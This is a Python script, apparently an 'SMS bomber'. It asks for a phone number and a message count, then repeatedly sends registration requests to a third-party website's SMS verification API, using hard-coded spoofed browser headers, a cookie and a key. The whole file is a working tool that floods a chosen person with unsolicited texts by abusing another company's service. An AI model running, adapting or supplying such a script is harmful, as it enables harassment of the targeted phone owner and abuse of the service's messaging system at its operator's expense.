# = = = = = = = = = = = = «COLOR» = = = = = = = = = = = #

R     ="\033[1;31m"      # Red
G     ="\033[1;32m"      # Green
Y     ="\033[1;33m"      # Yellow
B     ="\033[1;34m"      # Blue
P     ="\033[1;35m"      # Purple
C     ="\033[1;36m"      # Cyan
W    ="\033[1;37m"      # White
R1   = '\033[2;31m'      #Red_2
P1   = '\033[2;35m'      # Pink
LB   = '\033[2;36m'      # Cloud 
L      = '\033[1;34m    ' # Light_Blue

# = = = = = = = = = = = = «LIBRARY» = = = = = = = = = = = #
import uuid,random,user_agent,datetime,string,time,threading,json,secrets,subprocess,hashlib
import requests, pyfiglet, termcolor, sys, os, webbrowser as time, datetime, time
from random import *
from user_agent import generate_user_agent
from datetime import datetime
from user_agent import generate_user_agent
from datetime import datetime
from random import *
from time import sleep
from colorama import Fore, Style
from uuid import uuid4
from secrets import token_hex
from bs4 import BeautifulSoup
aa = 0
zz = 0

# = = = = = = = = = = = = = = = = = = = = = = = 

try:
	num = input('\033[1;32mEnter Phone Number \033[1;34m:\033[1;39m ')
	cc = '2'
	count = int(input('\033[1;32mEnter Number Of Messages \033[1;34m: \033[1;39m'))
except:
	print()
	print('\033[1;31mwrong entry')
	exit('\033[1;39m')
print()

op = 0
while op<count:
    hd = {
'Host': 'www.es-glzx.com',
'Connection': 'keep-alive',
'Content-Length': '87',
'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
'Lang': '',
'Content-Type': 'application/x-www-form-urlencoded',
'sec-ch-ua-mobile': '?0',
'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; SM-T585) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'sec-ch-ua-platform': '"Android"',
'Accept': '*/*',
'Origin': 'https://www.es-glzx.com',
'Sec-Fetch-Site': 'same-origin',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Dest': 'empty',
'Referer': 'https://www.es-glzx.com/',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
'Cookie': 'aliyungf_tc=082bbe1c09579ecff283dbb7f3da7a79bbcfabb39c4191f818cb481042c03b40'
  }
  
    url = 'https://www.es-glzx.com/api/sms/send'
    data = {
'mobile':cc+num,
'event':'register',
't':'1673897964748',
'key':'35a9fd6933f06a430ca6564023419bdf'
}

    r = requests.post(url, headers=hd, data=data).text
    op = op + 1
    if 'successfully' in r:
    	print(f'\x1b[1;99m• \x1b[1;92mDone Send Sms {op}')
    	time.sleep(50)
    else:
    		print("\x1b[1;99m• \x1b[1;91mThere's a mistake")
    		print('\033[1;39m')
    		exit()

print('\033[1;39m')
                            
